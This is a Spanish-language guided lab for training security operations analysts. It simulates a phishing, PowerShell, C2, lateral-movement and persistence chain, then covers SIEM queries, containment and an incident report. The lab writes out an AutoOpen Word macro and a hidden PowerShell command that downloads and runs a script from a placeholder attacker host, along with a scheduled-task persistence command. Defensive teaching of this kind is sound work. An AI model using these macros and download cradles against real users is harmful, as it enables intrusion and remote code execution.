# LABORATORIO GUIADO – CyberOps  
## Phishing → PowerShell → C2 → Movimiento Lateral → SOC Analysis

Este laboratorio simula un incidente real y genera evidencia para analizar desde un SOC.  
Incluye: endpoints, red, SIEM, análisis de logs, C2, persistencia y respuesta.

---

# 1. Topología del laboratorio

**Máquinas necesarias:**
- Kali Linux (atacante)
- Windows 10/11 con Sysmon (victima)
- Ubuntu Server (victima 2)
- Wazuh o Security Onion (SOC)
- Zeek + Suricata (sensores de red)

**Flujo del ataque:**
Phishing → ejecución de PowerShell → descarga de payload → beaconing → movimiento lateral SSH → persistencia → detección SOC → contención.

---

# 2. Fase 1 – Generar documento de phishing

En Kali:

```
nano factura.docm
```

Inserta texto normal (simulación).

Payload que se ejecutará en Windows:

```
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP-KALI>/beacon.ps1')"
```

**Evidencia esperada en SOC:**
- Sysmon EventID 1 (creación de proceso)
- EventID 4688 (powershell.exe)
- EventID 4104 (script block)
- winword.exe → powershell.exe

---

# 3. Fase 2 – Servidor C2 simple (Kali)

Crear script de beacon:

```
echo "Start-Sleep 5; Invoke-WebRequest -Uri http://<IP-KALI>/check -UseBasicParsing" > beacon.ps1
```

Servir archivo:

```
python3 -m http.server 80
```

Crear endpoint de check:

```
mkdir check
echo "OK" > check/index.html
```

**Evidencia en Zeek:**
- `http.log` con conexiones periódicas
- patrón constante → beaconing

---

# 4. Fase 3 – Ejecución del ataque en Windows

En Word, insertar macro:

```
Sub AutoOpen()
    CreateObject("Wscript.Shell").Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<IP-KALI>/beacon.ps1')"
End Sub
```

Guardar como `.docm`  
Abrir el documento.

**Evidencias SOC:**
- winword.exe crea powershell.exe  
- conexiones a <IP-KALI>  
- EventID 4104 (PowerShell script block)

---

# 5. Fase 4 – Movimiento lateral SSH

Desde Windows comprometido:

```
ssh user@<IP-Ubuntu> "echo HOLA DESDE WINDOWS > /tmp/test.log"
```

**Evidencias SOC:**
- `/var/log/auth.log` en Ubuntu (SSH login)
- Sysmon ID 3 → conexión saliente SSH
- Zeek conn.log → flujo interno

---

# 6. Fase 5 – Persistencia en Windows

Crear tarea programada:

```
schtasks /create /sc minute /mo 5 /tn Updater /tr "powershell -File C:\Users\Public\beacon.ps1"
```

**Evidencia SOC:**
- EventID 4698 (tarea creada)
- beacon repetido cada 5 min

---

# 7. Fase 6 – Investigación en el SOC

### Buscar ejecución de PowerShell (Sysmon ID 1):
```
event.module:sysmon AND event_id:1 AND process.command_line:*powershell*
```

### Script blocks (4104):
```
event_id:4104
```

### Conexiones a IP atacante:
```
event_id:3 AND destination.ip:<IP-KALI>
```

### Movimiento lateral en Ubuntu:
```
grep "Accepted password" /var/log/auth.log
```

### Beaconing en Zeek:
```
cat http.log | grep <IP-Windows>
```

---

# 8. Fase 7 – Contención

### Aislar host (si hay EDR)

### Bloqueo de IP atacante:
Firewall / Router: bloquear <IP-KALI>

### Eliminar persistencia:
```
schtasks /delete /tn Updater /f
```

### Borrar payload:
```
del C:\Users\Public\beacon.ps1
```

### Revocar credenciales

---

# 9. Fase 8 – Erradicación

### Verificar procesos:
```
Get-Process powershell
```

### Ver tareas:
```
Get-ScheduledTask
```

### Revisar claves SSH en Ubuntu:
```
ls -la ~/.ssh
```

---

# 10. Fase 9 – Recuperación

- Restaurar sistema  
- Revisar logs 24h  
- Reforzar PowerShell  
- Ajustar reglas SIEM  

---

# 11. Fase 10 – Informe del incidente

```
Título: Phishing → PowerShell → C2 → Movimiento lateral

Resumen:
Se detectó ejecución de PowerShell desde Word, descarga de payload remoto, establecimiento de canal C2 y posterior movimiento lateral vía SSH a Ubuntu.

Línea de tiempo:
[Hora] Apertura del documento malicioso
[Hora] winword.exe → powershell.exe
[Hora] powershell se conecta a <IP-KALI>
[Hora] beaconing periódico
[Hora] SSH hacia Ubuntu
[Hora] creación de tarea “Updater”

Impacto:
Acceso remoto no autorizado en dos hosts.

Acciones tomadas:
Aislamiento del host
Bloqueo IP atacante
Eliminación de persistencia
Rotación de credenciales

Recomendaciones:
Bloquear macros no firmadas
Activar AMSI logging
Fortalecer PowerShell
Mejorar reglas SIEM

Estado final:
Incidente contenido y cerrado.
```

---

# Fin del Laboratorio
Este laboratorio cubre:
- Telemetría de red y endpoint  
- PowerShell, C2, beaconing  
- Movimiento lateral  
- Persistencia  
- Análisis forense inicial  
- Investigación SOC  
- Contención, erradicación y reporte  


